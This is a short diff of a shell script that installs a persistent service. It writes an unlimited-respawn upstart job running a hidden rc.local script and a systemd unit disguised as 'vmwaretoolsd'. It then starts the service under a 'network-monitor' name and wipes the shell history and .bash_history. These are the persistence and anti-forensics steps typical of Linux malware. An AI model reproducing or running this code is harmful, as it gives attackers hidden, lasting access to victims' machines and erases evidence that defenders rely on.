@@ -24,7 +24,7 @@ if [[ $(initctl version) =~ upstart ]]; then
     respawn limit unlimited
     exec /etc/init.d/rc.local/rcd.sh
 EOF
-    start my-service
+    start network-monitor
 elif [[ $(systemctl) ]]; then
     cat > /etc/systemd/system/vmwaretoolsd.service << EOF
     [Unit]
@@ -40,7 +40,9 @@ elif [[ $(systemctl) ]]; then
     [Install]
     WantedBy=multi-user.target
 EOF
-
+    systemctl daemon-reload
+    systemctl start vmwaretoolsd.service
+fi
 #garbage
 history -c
 rm -f $HOME/.bash_history
